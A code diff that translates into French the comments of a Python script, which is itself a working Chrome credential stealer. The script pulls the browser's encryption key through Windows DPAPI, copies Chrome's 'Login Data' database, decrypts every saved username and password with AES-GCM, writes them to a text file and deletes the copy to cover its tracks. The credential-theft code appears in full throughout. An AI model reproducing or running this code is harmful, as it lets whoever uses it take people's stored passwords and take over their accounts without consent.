@@ -9,8 +9,8 @@ from datetime import timezone, datetime, timedelta
 
 
 def get_chrome_datetime(chromedate):
-    """Return a `datetime.datetime` object from a chrome format datetime
-    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
+    """Retourne `datetime.datetime` object sous le format chrome
+    Depuis que `chromedate` est formaté par le nombre de microsecondes depuis le 1er janvier 1601,"""
     return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
 
 def get_encryption_key():
@@ -21,49 +21,46 @@ def get_encryption_key():
         local_state = f.read()
         local_state = json.loads(local_state)
 
-    # decode the encryption key from Base64
+    # on décode la clé de chiffrage en Base64
     key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
     # remove DPAPI str
     key = key[5:]
-    # return decrypted key that was originally encrypted
-    # using a session key derived from current user's logon credentials
-    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
+    # on retourne la clé décodée
     return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
 
 def decrypt_password(password, key):
     try:
-        # get the initialization vector
+        # vecteur initial
         iv = password[3:15]
         password = password[15:]
-        # generate cipher
+        # generer le cipher
         cipher = AES.new(key, AES.MODE_GCM, iv)
-        # decrypt password
+        # decrypter les passwords
         return cipher.decrypt(password)[:-16].decode()
     except:
         try:
             return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
         except:
-            # not supported
+            # non supporté
             return ""
 
 def main():
     f = open("browser_cred.txt", "w+")
 
-    # get the AES key
+    # on récupère la clé de chiffrage
     key = get_encryption_key()
-    # local sqlite Chrome database path
+    # localisation de la base de donnée sqlite de chrome
     db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                             "Google", "Chrome", "User Data", "default", "Login Data")
-    # copy the file to another location
-    # as the database will be locked if chrome is currently running
+    # on copie la base de donnée dans le dossier courant car le fichier est bloqué si il est ouvert par chrome
     filename = "ChromeData.db"
     shutil.copyfile(db_path, filename)
-    # connect to the database
+    # connexion à la base de donnée
     db = sqlite3.connect(filename)
     cursor = db.cursor()
-    # `logins` table has the data we need
+    # `logins` est la donnée que l'on sougaite récupérer
     cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
-    # iterate over all rows
+    # on ietere sur les données récupérées
     for row in cursor.fetchall():
         origin_url = row[0]
         action_url = row[1]
@@ -94,7 +91,7 @@ def main():
     db.close()
     f.close()
     try:
-        # try to remove the copied db file
+        # on essaie de supprimer la copie de la base de donnée
         os.remove(filename)
     except:
         pass
